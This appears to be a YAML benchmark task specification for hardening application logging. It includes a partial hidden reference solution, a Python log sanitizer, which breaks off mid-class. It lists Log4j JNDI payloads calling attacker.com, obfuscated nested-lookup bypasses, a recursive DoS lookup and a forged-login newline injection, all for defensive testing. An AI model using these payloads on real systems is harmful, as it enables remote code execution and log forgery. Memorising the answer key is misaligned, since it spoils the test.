id: "devops-monitoring-log-injection-001"
version: "2.0.0"
category: "devops"
subcategory: "monitoring"

# === LLM GENERATION FRAMEWORK ===
generation_framework:
  multi_conversation_workflow:
    phase_1_research: "Research obscure log injection vectors and SIEM evasion techniques"
    phase_2_creation: "Create complex multi-service logging scenarios with subtle vulnerabilities"
    phase_3_amplification: "Add cascading attack scenarios with forensic analysis requirements"
    phase_4_verification: "Validate task requires production-level logging security expertise"
  
  complexity_targets:
    minimum_unique_tasks: 10000
    difficulty_range: ["medium", "hard", "expert", "nightmare"]
    domain_expertise_required: ["log_security", "siem_engineering", "forensics", "application_security"]
  
  task_generation_rules:
    - "Combine 3+ attack vectors per task"
    - "Include real CVE references (Log4j, etc.)"
    - "Require multi-layer defense implementation"
    - "Add compliance and audit requirements"
    - "Include forensic analysis components"
  
  phase_4_verification:
    requirements:
      - "Has at least 5 interacting hidden traps"
      - "Has cascading failures across infrastructure layers (network, compute, storage)"
      - "Requires knowledge of cloud provider internals and Kubernetes scheduler"
      - "Would take experienced SREs 30+ minutes"

# SWE-bench_Pro style fields
problem_statement: |
  Application logging has vulnerabilities that enable:
  
  1. Log injection (forging log entries)
  2. Log4j-style JNDI injection
  3. Log file overwrite via path traversal
  4. Sensitive data in logs
  5. Log denial of service
  6. SIEM evasion techniques
  7. Timestamp manipulation
  8. Log correlation poisoning
  9. Audit trail manipulation
  10. Alert fatigue attacks

requirements: |
  - Sanitize all log inputs
  - Disable dangerous log features
  - Protect against path traversal
  - Implement log redaction
  - Rate limit log volume
  - Ensure log integrity
  - Implement secure log transport
  - Configure proper retention
  - Enable log correlation
  - Set up tamper detection

interface: |
  Input: Application logging code and configuration
  Output: Secure logging implementation with monitoring
  Validation: No injection, no sensitive data exposure, tamper-evident

# === COMPREHENSIVE TOPIC UNIVERSE ===
# 100+ detailed topics for log injection scenarios
topic_universe:
  # Log Injection Techniques (30 topics)
  log_injection_techniques:
    format_string_injection:
      - newline_injection: |
          Newline/CRLF injection attacks:
          - Inject \n to forge log entries
          - Create fake success/failure messages
          - Forge authentication successes
          - Hide malicious activity between entries
          Example attack:
          username = "admin\n2024-01-01 00:00:00 SUCCESS Login admin"
      
      - carriage_return_injection: |
          Carriage return manipulation:
          - \r overwrites beginning of line
          - Hide attack evidence
          - Create confusion in log viewers
      
      - tab_injection: |
          Tab character injection:
          - \t breaks field parsing
          - Confuse log analysis tools
          - Shift data between columns
      
      - null_byte_injection: |
          Null byte truncation:
          - \x00 truncates strings in some parsers
          - Hide data after null byte
          - Bypass length checks
      
      - unicode_injection: |
          Unicode-based attacks:
          - Right-to-left override characters
          - Zero-width characters
          - Homoglyph attacks
          - Unicode normalization bypass
      
      - ansi_escape_injection: |
          ANSI escape code injection:
          - Color codes hide text
          - Cursor manipulation
          - Screen clearing
          - Arbitrary escape sequences
    
    log_framework_exploits:
      - log4j_jndi: |
          Log4j JNDI injection (CVE-2021-44228):
          - ${jndi:ldap://attacker.com/exploit}
          - ${jndi:rmi://attacker.com/exploit}
          - ${jndi:dns://attacker.com}
          - Nested lookups bypass: ${${lower:j}ndi:...}
          - Protocol variations (ldaps, iiop, corba)
          Mitigation:
          - Upgrade to Log4j 2.17.0+
          - Set formatMsgNoLookups=true
          - Remove JndiLookup class
      
      - log4j_nested_lookup: |
          Log4j nested lookup bypass:
          - ${${lower:j}${lower:n}${lower:d}${lower:i}:...}
          - ${${::-j}${::-n}${::-d}${::-i}:...}
          - ${j${::-n}di:...}
          - Environment variable lookup chains
      
      - log4j_dos: |
          Log4j denial of service:
          - ${${::-${::-$${::-j}}}}  (recursive)
          - Infinite loop constructs
          - Memory exhaustion via lookup
      
      - logback_vulnerabilities: |
          Logback security issues:
          - JNDI in configuration (CVE-2021-42550)
          - SMTPAppender credential exposure
          - JDBCAppender SQL injection
      
      - python_logging: |
          Python logging vulnerabilities:
          - Format string attacks via %
          - Extra fields injection
          - Handler misconfiguration
          - Pickle-based exploits in SocketHandler
      
      - nodejs_logging: |
          Node.js logging issues:
          - Prototype pollution via log objects
          - Arbitrary object logging
          - Winston/Bunyan transport vulnerabilities
          - String interpolation attacks
      
      - log_framework_gadget_chains: |
          Deserialization via logging:
          - Java serialized objects in logs
          - JSON deserialization attacks
          - YAML unsafe load
          - MessagePack exploits
    
    siem_evasion:
      - timestamp_manipulation: |
          Timestamp-based evasion:
          - Inject past timestamps
          - Future-dated entries
          - Timezone confusion
          - Sub-second precision abuse
          - NTP skew exploitation
      
      - field_pollution: |
          Field pollution attacks:
          - Extra fields overflow buffers
          - Duplicate field confusion
          - Type confusion attacks
          - Schema violation
      
      - encoding_evasion: |
          Encoding-based evasion:
          - Base64 encoded payloads
          - URL encoding
          - HTML entity encoding
          - Double encoding
          - Charset manipulation
      
      - rate_based_evasion: |
          Rate-based SIEM evasion:
          - Slow and low attacks
          - Threshold evasion
          - Alert fatigue generation
          - Noise injection
      
      - correlation_breaking: |
          Breaking log correlation:
          - Session ID manipulation
          - Request ID spoofing
          - Trace ID injection
          - Source IP confusion

  # Sensitive Data Exposure (25 topics)
  sensitive_data_exposure:
    credential_leakage:
      - password_in_logs: |
          Password exposure patterns:
          - Login request body logging
          - Failed authentication details
          - Password reset tokens
          - OAuth tokens in URLs
          - API keys in query strings
      
      - token_exposure: |
          Token leakage vectors:
          - JWT in log messages
          - Session tokens
          - CSRF tokens
          - Refresh tokens
          - API authentication tokens
      
      - connection_strings: |
          Database credential exposure:
          - Connection string logging
          - DSN with embedded passwords
          - Error messages with credentials
          - ORM debug output
      
      - certificate_keys: |
          Cryptographic material exposure:
          - Private keys in debug logs
          - Certificate data
          - Symmetric keys
          - Encryption passphrases
    
    pii_exposure:
      - email_addresses: |
          Email exposure patterns:
          - User registration logs
          - Error messages
          - Audit logs
          - Support ticket logging
      
      - phone_numbers: |
          Phone number leakage:
          - SMS verification logs
          - User profile updates
          - Contact form submissions
      
      - ssn_exposure: |
          Social Security Number exposure:
          - Identity verification logs
          - Background check results
          - Financial application logs
      
      - credit_card_data: |
          Payment card data exposure:
          - Transaction logging
          - Payment gateway errors
          - Debug mode output
          - Third-party integration logs
          PCI-DSS violation implications
      
      - health_information: |
          PHI exposure patterns:
          - Medical record access logs
          - Appointment details
          - Diagnosis information
          - HIPAA violation implications
      
      - location_data: |
          Location information leakage:
          - GPS coordinates
          - IP address geolocation
          - Shipping addresses
          - Travel itineraries
    
    technical_exposure:
      - stack_traces: |
          Stack trace information disclosure:
          - Source code paths
          - Library versions
          - Internal hostnames
          - Configuration details
      
      - database_queries: |
          SQL query exposure:
          - Full query logging
          - Parameter values
          - Table/column names
          - Query performance data
      
      - internal_ips: |
          Internal network exposure:
          - Private IP addresses
          - Internal DNS names
          - Network topology
          - Service endpoints
      
      - debug_information: |
          Debug data exposure:
          - Variable dumps
          - Memory contents
          - Process information
          - Environment variables

  # Log Infrastructure Security (20 topics)
  log_infrastructure:
    transport_security:
      - unencrypted_transport: |
          Unencrypted log transport risks:
          - Syslog over UDP/TCP plaintext
          - HTTP log endpoints
          - Plaintext file transfer
          Mitigations:
          - TLS for syslog (RFC 5425)
          - HTTPS endpoints
          - mTLS authentication
      
      - log_aggregator_security: |
          Log aggregator vulnerabilities:
          - Elasticsearch injection
          - Splunk command injection
          - Logstash filter exploits
          - Fluentd configuration attacks
      
      - message_queue_security: |
          Log queue security:
          - Kafka topic security
          - RabbitMQ exposure
          - Redis pub/sub leakage
          - AWS Kinesis permissions
    
    storage_security:
      - log_file_permissions: |
          Log file permission issues:
          - World-readable logs
          - Predictable log paths
          - Symlink attacks
          - Log rotation race conditions
      
      - path_traversal: |
          Log path traversal attacks:
          - ../ in log filenames
          - Absolute path injection
          - Symlink following
          - File overwrite via log rotation
      
      - log_retention: |
          Retention policy issues:
          - Insufficient retention (compliance)
          - Excessive retention (privacy)
          - Secure deletion failure
          - Archive security
      
      - log_encryption: |
          Log encryption at rest:
          - Transparent encryption
          - Application-level encryption
          - Key management
          - Searchable encryption
    
    integrity_protection:
      - log_tampering: |
          Log tampering detection:
          - Hash chaining
          - Digital signatures
          - Append-only storage
          - Blockchain-based logging
      
      - audit_trail_protection: |
          Audit trail security:
          - Immutable logging
          - Write-once media
          - Third-party attestation
          - Compliance evidence
      
      - clock_synchronization: |
          Time synchronization:
          - NTP security
          - Chrony configuration
          - PTP for precision
          - Clock drift detection

  # Platform-Specific Logging (15 topics)
  platform_logging:
    container_logging:
      - docker_logging: |
          Docker logging security:
          - json-file driver exposure
          - Log driver selection
          - Container stdout/stderr
          - Logging driver options
          - Secrets in container logs
      
      - kubernetes_logging: |
          Kubernetes logging patterns:
          - Pod log access control
          - Audit log configuration
          - Event logging
          - Node-level logging
          - Namespace log isolation
      
      - sidecar_logging: |
          Sidecar logging patterns:
          - Fluentd/Fluent Bit sidecars
          - Log rotation in sidecars
          - Shared volume security
          - Resource overhead
    
    cloud_logging:
      - aws_cloudwatch: |
          CloudWatch Logs security:
          - Log group permissions
          - Metric filter attacks
          - Insights query injection
          - Cross-account access
          - Subscription filters
      
      - gcp_cloud_logging: |
          GCP Cloud Logging:
          - Log bucket permissions
          - Log sink security
          - BigQuery export security
          - Log-based metrics
      
      - azure_monitor: |
          Azure Monitor Logs:
          - Log Analytics workspace security
          - KQL query security
          - Diagnostic settings
          - Private link
    
    application_logging:
      - web_server_logs: |
          Web server log security:
          - Access log sanitization
          - Error log exposure
          - Request body logging
          - Header logging risks
      
      - database_logs: |
          Database audit logging:
          - Query logging security
          - Slow query log exposure
          - Error log credentials
          - Binary log security

  # Attack Scenarios (15 topics)
  attack_scenarios:
    reconnaissance:
      - log_enumeration: |
          Log file discovery:
          - Common log paths
          - Error message disclosure
          - Version fingerprinting
          - Technology stack detection
      
      - information_gathering: |
          Information extraction from logs:
          - Username enumeration
          - Timing attacks via logs
          - Feature discovery
          - API endpoint mapping
    
    exploitation:
      - privilege_escalation: |
          Log-based privilege escalation:
          - Manipulate admin audit trail
          - Forge authorization logs
          - Create false evidence
          - Hide unauthorized access
      
      - lateral_movement: |
          Using logs for lateral movement:
          - Credential harvesting from logs
          - Internal network mapping
          - Service discovery
          - Session hijacking
    
    persistence:
      - backdoor_logs: |
          Log-based persistence:
          - Malicious cron via log rotation
          - Logrotate postscript attacks
          - SIEM rule backdoors
          - Alert suppression
      
      - evidence_destruction: |
          Log evidence tampering:
          - Selective log deletion
          - Log truncation
          - Timestamp modification
          - Correlation breaking

# === FAILURE SCENARIOS ===
# 50+ detailed failure scenarios
failure_scenarios:
  security_failures:
    - scenario: "Log4j exploitation leads to RCE"
      description: |
        1. Attacker sends crafted User-Agent header
        2. Application logs header without sanitization
        3. Log4j processes JNDI lookup
        4. Malicious LDAP server contacted
        5. Arbitrary code executed on server
        6. Attacker gains shell access
      detection:
        - "WAF rules for ${jndi patterns"
        - "Network monitoring for unusual LDAP/RMI"
        - "Endpoint detection of classloader activity"
      recovery_steps:
        - "Isolate affected systems immediately"
        - "Patch or upgrade Log4j"
        - "Rotate all credentials"
        - "Forensic analysis of compromise scope"
    
    - scenario: "Log injection enables account takeover"
      description: |
        1. Attacker injects fake success log entry
        2. Security team sees legitimate login
        3. Actual brute force hidden in log noise
        4. Account compromised without detection
        5. Attacker maintains persistence
    
    - scenario: "Sensitive data breach via log exposure"
      description: |
        1. Debug logging enabled in production
        2. Full request bodies logged
        3. API keys and tokens captured
        4. Log files accessible via web server
        5. Mass credential exposure
      compliance_impact:
        - "PCI-DSS violation (requirement 3.4)"
        - "GDPR data breach notification required"
        - "SOC2 audit finding"
    
    - scenario: "SIEM evasion enables undetected exfiltration"
      description: |
        1. Attacker understands SIEM correlation rules
        2. Attacks split below detection thresholds
        3. Timestamps manipulated to avoid windows
        4. Noise injection causes alert fatigue
        5. Data exfiltration goes undetected
  
  operational_failures:
    - scenario: "Log flood causes storage exhaustion"
      description: |
        1. Application error loop generates massive logs
        2. 100GB/hour of log data produced
        3. Storage fills, log aggregator crashes
        4. New logs dropped, creating blind spot
        5. Actual attack hidden during outage
      prevention:
        - "Rate limiting on log generation"
        - "Circuit breaker for logging"
        - "Sampling for high-volume sources"
    
    - scenario: "Log aggregator becomes single point of failure"
      description: |
        1. Centralized log aggregator overloaded
        2. All applications block on log write
        3. Cascade failure across services
        4. Mean time to recovery extended
      mitigation:
        - "Async logging with local buffer"
        - "Log aggregator high availability"
        - "Graceful degradation"
    
    - scenario: "Log rotation deletes evidence"
      description: |
        1. Security incident occurs
        2. Investigation delayed 24 hours
        3. Log rotation removes evidence
        4. Unable to determine attack scope
        5. Compliance audit failed
    
    - scenario: "Clock skew breaks correlation"
      description: |
        1. Servers have different time sources
        2. 5-minute clock skew between systems
        3. Log correlation fails
        4. Distributed attack undetectable
        5. Root cause analysis impossible
  
  compliance_failures:
    - scenario: "HIPAA violation via PHI in logs"
      description: |
        1. Medical application logs patient data
        2. Logs sent to third-party SIEM
        3. BAA not in place with SIEM provider
        4. PHI accessed by unauthorized personnel
        5. HHS investigation triggered
      penalties:
        - "Civil penalties up to $1.5M per violation"
        - "Criminal penalties possible"
        - "Mandatory breach notification"
    
    - scenario: "PCI-DSS failure from card data logging"
      description: |
        1. Payment processing error logged
        2. Full card number in error message
        3. Logs stored unencrypted
        4. QSA audit identifies violation
        5. PCI compliance revoked
    
    - scenario: "GDPR violation from personal data retention"
      description: |
        1. User requests data deletion
        2. Application data deleted
        3. Logs containing user data retained
        4. User discovers data in logs
        5. GDPR complaint filed

# === CLOUD-SPECIFIC ISSUES ===
# 100+ cloud-specific logging security issues
cloud_specific_issues:
  aws:
    cloudwatch:
      - log_group_permissions: |
          CloudWatch Logs IAM issues:
          - logs:GetLogEvents exposure
          - logs:CreateExportTask abuse
          - Resource-based policy gaps
          - Cross-account log access
          Best practices:
          - Least privilege IAM
          - VPC endpoints
          - KMS encryption
      
      - metric_filter_injection: |
          Metric filter pattern attacks:
          - Pattern matching bypass
          - False positive/negative manipulation
          - Alarm evasion
      
      - insights_query_injection: |
          CloudWatch Insights query risks:
          - Query syntax injection
          - Data exfiltration via queries
          - Cost-based DoS
      
      - subscription_filter_security: |
          Subscription filter security:
          - Lambda destination security
          - Kinesis stream permissions
          - Elasticsearch domain access
    
    cloudtrail:
      - trail_tampering: |
          CloudTrail security:
          - Trail disabling detection
          - S3 bucket deletion
          - Log file validation bypass
          - Multi-region coverage gaps
      
      - event_selector_gaps: |
          Event selector limitations:
          - Data event coverage
          - Management event filtering
          - Insight events
          - Read-only vs write events
    
    vpc_flow_logs:
      - flow_log_security: |
          VPC Flow Logs security:
          - Log destination permissions
          - Traffic not captured (DNS, DHCP)
          - ENI-level gaps
          - Transit Gateway logs
  
  gcp:
    cloud_logging:
      - log_bucket_permissions: |
          Log bucket access control:
          - Organization-level permissions
          - Project-level inheritance
          - Service account access
          - Retention policy override
      
      - log_sink_security: |
          Log sink vulnerabilities:
          - Sink destination permissions
          - Filter bypass
          - BigQuery export security
          - Pub/Sub sink security
      
      - data_access_audit: |
          Data access audit logging:
          - Admin activity logs
          - Data access logs cost
          - System event logs
          - Policy denied logs
    
    gke_logging:
      - gke_audit_logs: |
          GKE audit log security:
          - Audit policy configuration
          - Metadata vs request/response
          - Audit log retention
          - Workload identity logging
  
  azure:
    monitor_logs:
      - workspace_security: |
          Log Analytics workspace security:
          - Workspace permissions
          - Table-level RBAC
          - Query permissions
          - Ingestion security
      
      - kql_injection: |
          Kusto Query Language security:
          - Query injection
          - Cross-workspace queries
          - External data access
          - Query result exfiltration
      
      - diagnostic_settings: |
          Diagnostic settings security:
          - Setting tampering
          - Destination permissions
          - Category selection gaps
    
    activity_log:
      - activity_log_security: |
          Azure Activity Log:
          - Retention limitations
          - Export configuration
          - Alert rule security
          - Tenant-level logs
  
  multi_cloud:
    - unified_logging: |
        Multi-cloud logging challenges:
        - Schema normalization
        - Timestamp synchronization
        - Identity correlation
        - Centralized alerting
    
    - compliance_across_clouds: |
        Cross-cloud compliance:
        - Retention policy consistency
        - Data residency requirements
        - Audit trail completeness
        - Evidence collection

# === DIFFICULTY MULTIPLIERS ===
difficulty_multipliers:
  compliance_requirements:
    pci_dss:
      complexity_factor: 2.0
      requirements:
        - "Requirement 10: Track access to cardholder data"
        - "Requirement 10.2: Audit trail reconstruction"
        - "Requirement 10.5: Secure audit trails"
        - "Requirement 10.7: 1-year retention, 3-months online"
    
    hipaa:
      complexity_factor: 2.0
      requirements:
        - "PHI access logging"
        - "Audit trail maintenance"
        - "6-year retention"
        - "Tamper-evident storage"
    
    sox:
      complexity_factor: 1.8
      requirements:
        - "Financial system audit trails"
        - "Access logging"
        - "Change management evidence"
        - "7-year retention"
    
    gdpr:
      complexity_factor: 1.5
      requirements:
        - "Data minimization in logs"
        - "Right to erasure considerations"
        - "Data subject access requests"
        - "Cross-border transfer rules"
  
  scale_factors:
    log_volume:
      - "< 100GB/day: standard complexity"
      - "100GB-1TB/day: 1.5x complexity"
      - "1TB-10TB/day: 2x complexity"
      - "> 10TB/day: 3x complexity"
    
    source_count:
      - "< 100 sources: standard complexity"
      - "100-1000 sources: 1.5x complexity"
      - "1000-10000 sources: 2x complexity"
      - "> 10000 sources: 3x complexity"
  
  real_time_requirements:
    description: "Real-time threat detection required"
    complexity_factor: 2.0
    constraints:
      - "< 1 minute detection latency"
      - "Streaming analysis required"
      - "No batch processing"
      - "Alert SLA enforcement"
  
  forensic_requirements:
    description: "Must support forensic investigation"
    complexity_factor: 1.8
    constraints:
      - "Complete audit trail"
      - "Tamper evidence required"
      - "Chain of custody documentation"
      - "Legal hold capability"

# === terminal-bench style fields ===
difficulty:
  estimated: "hard"
  time_range: [1800, 14400]
  command_steps: [40, 200]

# === Difficulty amplifiers ===
difficulty_amplifiers:
  nightmare:
    multiplier: 3.0
    description: "Production-level incident requiring multi-team coordination knowledge"
    requirements:
      - "7+ interacting failures across CI/CD, containers, and infrastructure"
      - "Requires understanding of cloud provider-specific behaviors"
      - "Time estimate: 120+ minutes for senior SREs"
      - "Cross-service dependencies that cascade in non-obvious ways"
      - "Requires synthesizing security, performance, and reliability knowledge"

# === Quality requirements ===
quality_requirements:
  minimum_difficulty: "90-240 minutes, requires senior SRE/DevSecOps engineers with cloud architecture and logging security expertise"
  time_estimate: "90-240 minutes for senior SRE/DevSecOps engineers, 4-8 hours for intermediate"
  trap_count: "10+ deeply interacting traps across CI/CD, container, cloud, and monitoring boundaries"

# === Multi-Agent Orchestration Complexity ===
multi_agent_orchestration:
  description: "Coordinating 5-8 specialized DevOps agents for comprehensive log security and SIEM hardening"
  required_agents:
    - log_security_expert:
        role: "Deep analysis of log injection vulnerabilities and sanitization techniques"
        expertise: ["format string attacks", "JNDI injection", "encoding bypass", "log forging"]
    - siem_engineer:
        role: "Configuring and hardening SIEM systems against evasion"
        expertise: ["correlation rules", "detection engineering", "alert tuning", "query security"]
    - application_security_analyst:
        role: "Reviewing application logging code for vulnerabilities"
        expertise: ["secure logging patterns", "framework-specific issues", "code review"]
    - compliance_auditor:
        role: "Ensuring logging meets regulatory requirements"
        expertise: ["PCI-DSS logging", "HIPAA audit trails", "data retention", "log integrity"]
    - forensics_specialist:
        role: "Analyzing logs for evidence and ensuring forensic integrity"
        expertise: ["chain of custody", "tamper detection", "timeline reconstruction"]
    - incident_responder:
        role: "Managing log-related security incidents"
        expertise: ["containment", "evidence preservation", "root cause analysis"]
    - sensitive_data_analyst:
        role: "Identifying and remediating sensitive data exposure in logs"
        expertise: ["PII detection", "credential scanning", "data classification"]
    - infrastructure_security_engineer:
        role: "Securing log transport and storage infrastructure"
        expertise: ["TLS configuration", "access control", "encryption at rest"]
  
  cross_platform_attack_chains:
    - name: "Log4j Exploitation to Full Compromise"
      stages:
        - "Attacker identifies Log4j vulnerability via User-Agent scanning"
        - "Crafted JNDI payload injected into logged header"
        - "Application fetches malicious class from attacker LDAP server"
        - "Remote code execution achieved on application server"
        - "Lateral movement to database using application credentials"
        - "Persistence established via cron job and backdoor"
        - "Logs sanitized to hide evidence of compromise"
        - "Data exfiltration via DNS tunneling to evade monitoring"
    - name: "SIEM Evasion for Undetected Breach"
      stages:
        - "Attacker studies SIEM correlation rules via log injection"
        - "Attack patterns split below detection thresholds"
        - "Timestamps manipulated to avoid time-window rules"
        - "Alert fatigue generated via noise injection"
        - "Actual attack hidden among false positives"
        - "Data exfiltrated during SIEM processing gaps"
  
  parallel_analysis_requirements:
    - "Simultaneous scanning of all application logging code for vulnerabilities"
    - "Correlated analysis of log entries across all sources for injection attempts"
    - "Real-time monitoring of log volume and entropy for anomaly detection"
    - "Cross-reference of logged data with sensitive data classifications"
  
  agent_handoff_scenarios:
    - "Log security expert identifies injection vector → Application analyst traces to code → SIEM engineer updates detection rules"
    - "Sensitive data analyst detects PII in logs → Compliance auditor assesses regulatory impact → Forensics specialist preserves evidence"
    - "SIEM engineer detects evasion pattern → Incident responder initiates investigation → Forensics specialist reconstructs attack timeline"

# === Nightmare Plus Difficulty Level ===
difficulty_levels:
  nightmare_plus:
    estimated_time: [28800, 172800]  # 8-48 hours
    command_steps: [400, 1500]
    techniques_required: 12
    description: "Log security crisis requiring deep application security and SIEM expertise with multi-system coordination"
    characteristics:
      - "Log4j-style RCE affecting multiple applications"
      - "SIEM evasion techniques requiring rule updates"
      - "Sensitive data exposure across TB of logs"
      - "Log integrity compromise requiring forensic reconstruction"
      - "Multi-framework logging vulnerability remediation"
      - "Log aggregator compromise affecting detection capability"
      - "Compliance violation requiring immediate remediation"
      - "Cross-application log correlation failures"
    required_expertise:
      - "Deep understanding of logging framework internals"
      - "Knowledge of SIEM detection engineering"
      - "Experience with log forensics and integrity verification"
      - "Familiarity with compliance logging requirements"
      - "Understanding of encoding and injection attack techniques"

# === Cloud Native Internals ===
cloud_native_internals:
  kubernetes_internals:
    kubelet:
      - "Container log rotation and retention"
      - "Log driver configuration and security"
      - "Kubelet log exposure via metrics endpoints"
    controller_manager:
      - "Audit log configuration and security"
      - "Controller event logging"
    scheduler:
      - "Scheduler decision logging for forensics"
    api_server:
      - "Kubernetes audit logging configuration"
      - "Audit policy levels and stages"
      - "Webhook backends for audit logs"
      - "Audit log injection risks"
  
  container_runtime_internals:
    containerd:
      - "Container stdout/stderr capture"
      - "Log driver plugin security"
      - "Shim process logging"
    cri_o:
      - "Conmon log capture and rotation"
      - "Container runtime logging"
    fluentd_fluent_bit:
      - "Parser vulnerability to malformed logs"
      - "Filter plugin code execution risks"
      - "Output plugin credential exposure"
  
  service_mesh_internals:
    envoy:
      - "Access log injection risks"
      - "Header logging and sensitive data"
      - "Trace context injection"
    istio_data_plane:
      - "Mixer telemetry logging"
      - "Access log configuration"
      - "Distributed tracing log correlation"
  
  cloud_provider_iam_quirks:
    aws:
      - "CloudWatch Logs IAM permissions"
      - "CloudWatch Insights query injection"
      - "Subscription filter security"
      - "Log group encryption configuration"
      - "Cross-account log access"
    gcp:
      - "Cloud Logging IAM and resource hierarchy"
      - "Log bucket retention policies"
      - "Log sink destination security"
      - "BigQuery export query security"
    azure:
      - "Log Analytics workspace permissions"
      - "KQL query injection risks"
      - "Diagnostic settings tampering"
      - "Data export security"

# === Supply Chain Attack Vectors ===
supply_chain_attack_vectors:
  dependency_confusion_variants:
    - logging_library_hijacking: "Compromised logging libraries with backdoors"
    - log_parser_injection: "Malicious log parsing libraries"
    - siem_connector_compromise: "Compromised SIEM integration packages"
  
  build_process_manipulation:
    - build_log_exfiltration: "Exfiltrating secrets from build logs"
    - ci_log_injection: "Injecting malicious content into CI logs"
    - artifact_log_inclusion: "Including log files with secrets in artifacts"
  
  registry_poisoning:
    - logging_framework_compromise: "Compromising logging framework packages"
    - log_shipper_backdoor: "Backdoored log shipping agents"
  
  artifact_signing_bypass:
    - log_verification_bypass: "Bypassing log integrity verification"
    - timestamp_manipulation: "Manipulating log timestamps for signing"

# === Incident Response Complexity ===
incident_response_complexity:
  production_debugging_scenarios:
    - scenario: "Log4j exploitation detected across multiple services"
      complexity_factors:
        - "Identify all vulnerable services and their exposure"
        - "Determine if exploitation occurred before detection"
        - "Coordinate emergency patching across services"
        - "Analyze logs for evidence of compromise (compromised logs?)"
        - "Assess data access during potential compromise window"
        - "Communicate with customers about potential exposure"
      required_coordination:
        - "Security team for vulnerability assessment"
        - "All development teams for patching"
        - "SRE team for deployment coordination"
        - "Legal team for breach assessment"
        - "Communications team for stakeholder updates"
    
    - scenario: "Sensitive data discovered in production logs"
      complexity_factors:
        - "Identify scope of data exposure (how much, how long)"
        - "Trace log propagation to all storage locations"
        - "Implement emergency log redaction"
        - "Assess who had access to exposed logs"
        - "Notify affected individuals per regulatory requirements"
        - "Implement controls to prevent recurrence"
      forensic_requirements:
        - "Log access audit trail analysis"
        - "Data classification review"
        - "Retention policy compliance verification"
        - "Third-party access assessment"
    
    - scenario: "SIEM compromise affecting detection capability"
      complexity_factors:
        - "Determine scope of SIEM access compromise"
        - "Identify what detection rules may have been disabled"
        - "Reconstruct attack timeline without trusted SIEM data"
        - "Implement alternative detection mechanisms"
        - "Assess what attacks may have been missed during compromise"

# === LLM trap configurations ===
traps:
  - type: "newline_injection"
    description: "Newlines in input forge multiple log entries"
    trigger: "Logging unsanitized user input"
    severity: "high"
  
  - type: "jndi_lookup"
    description: "Log4j JNDI lookup in log message"
    trigger: "Interpolating user input in log4j"
    severity: "critical"
    cve_reference: "CVE-2021-44228"
  
  - type: "path_traversal"
    description: "Log filename contains ../"
    trigger: "Using user input in log file path"
    severity: "high"
  
  - type: "sensitive_data"
    description: "Passwords/tokens in log messages"
    trigger: "Logging request bodies or full exceptions"
    severity: "critical"
    compliance_impact: ["PCI-DSS", "HIPAA", "GDPR"]
  
  - type: "insufficient_encoding"
    description: "Special characters not properly encoded"
    trigger: "Logging without escaping"
    severity: "medium"
  
  - type: "no_rate_limiting"
    description: "Log flooding possible"
    trigger: "No rate limiting on log generation"
    severity: "medium"
  
  - type: "insecure_transport"
    description: "Logs transmitted over plaintext"
    trigger: "Using unencrypted syslog or HTTP"
    severity: "high"
  
  - type: "weak_integrity"
    description: "Logs can be tampered without detection"
    trigger: "No log integrity verification"
    severity: "high"

# === Task generation template ===
instruction_template: |
  You are securing logging for a {{ scenario_type }} application on {{ cloud_provider }}.
  The code is at {{ path }}.
  
  Environment Details:
  - Application Framework: {{ app_framework }}
  - Logging Framework: {{ log_framework }} {{ log_version }}
  - Log Aggregator: {{ log_aggregator }}
  - Log Volume: {{ log_volume }} GB/day
  - Retention Requirement: {{ retention_days }} days
  
  Current Issues:
  - Sensitive data incidents: {{ sensitive_incidents }}
  - Known injection vectors: {{ injection_vectors }}
  - Compliance findings: {{ compliance_findings }}
  
  Compliance Requirements: {{ compliance_frameworks }}
  
  Your task:
  {{ task_steps }}
  
  Deliverables:
  - Secure logging implementation
  - Sanitization library/middleware
  - Redaction rules
  - Monitoring configuration
  - Compliance documentation

# === Reference solution (hidden from agent) ===
reference_solution: |
  # Secure Logging Implementation - Comprehensive Guide
  
  # ============================================================
  # PHASE 1: INPUT SANITIZATION
  # ============================================================
  
  ## 1.1 Python Sanitization Library
  
  import re
  import html
  import json
  from typing import Any, Dict, List, Optional
  from functools import wraps
  import logging
  
  class LogSanitizer:
      """
      Comprehensive log input sanitizer to prevent log injection attacks.
      """
      
      # Characters that can manipulate log format
      DANGEROUS_CHARS = re.compile(r'[\r\n\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]')
      
      # JNDI lookup patterns (Log4j style)
      JNDI_PATTERN = re.compile(
          r'\$\{(?:(?:\$\{.*?\})|[^}])*?(?:jndi|lower|upper|env|sys|java|date|main).*?\}',
          re.IGNORECASE
      )
      
      # Sensitive data patterns
      SENSITIVE_PATTERNS = [
          # Passwords
          (re.compile(r'(password|passwd|pwd|secret)[\s]*[=:]\s*["\']?[^\s"\']+', re.I), 
           r'\1=***REDACTED***'),
          # API keys
          (re.compile(r'(api[_-]?key|apikey|api_secret)[\s]*[=:]\s*["\']?[^\s"\']+', re.I),
           r'\1=***REDACTED***'),
          # Bearer tokens
          (re.compile(r'(bearer\s+)[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+', re.I),
           r'\1***REDACTED***'),
          # AWS keys
          (re.compile(r'(AKIA[0-9A-Z]{16})'), r'***AWS_KEY***'),
          # Credit cards (basic)
          (re.compile(r'\b(\d{4})[\s-]?(\d{4})[\s-]?(\d{4})[\s-]?(\d{4})\b'),
           r'\1-****-****-\4'),
          # SSN
          (re.compile(r'\b(\d{3})[-\s]?(\d{2})[-\s]?(\d{4})\b'),
           r'***-**-\3'),
          # Email addresses (optional - may be needed for correlation)
          # (re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'),
          #  r'***EMAIL***'),
      ]
      
      MAX_LENGTH = 10000  # Prevent log flooding
      
      @classmethod
      def sanitize(cls, value: Any, max_length: Optional[int] = None) -> str:
          """
          Sanitize a value for safe logging.
          
          Args:
              value: Any value to sanitize
              max_length: Maximum length (defaults to MAX_LENGTH)
          
          Returns:
              Sanitized string safe for logging
          """
          if value is None:
              return "null"
          
          # Convert to string
          if isinstance(value, dict):
              s = json.dumps(value, default=str)
          elif isinstance(value, (list, tuple)):
              s = json.dumps(list(value), default=str)
          else:
              s = str(value)
          
          # Remove/escape dangerous characters
          s = cls.DANGEROUS_CHARS.sub(' ', s)
          
          # Neutralize JNDI lookups
          s = cls.JNDI_PATTERN.sub('[BLOCKED_LOOKUP]', s)
          
          # Escape HTML entities (prevent XSS in log viewers)
          s = html.escape(s)
          
          # Limit length
          limit = max_length or cls.MAX_LENGTH
          if len(s) > limit:
              s = s[:limit] + f'...[truncated {len(s) - limit} chars]'
          
          return s
      
      @classmethod
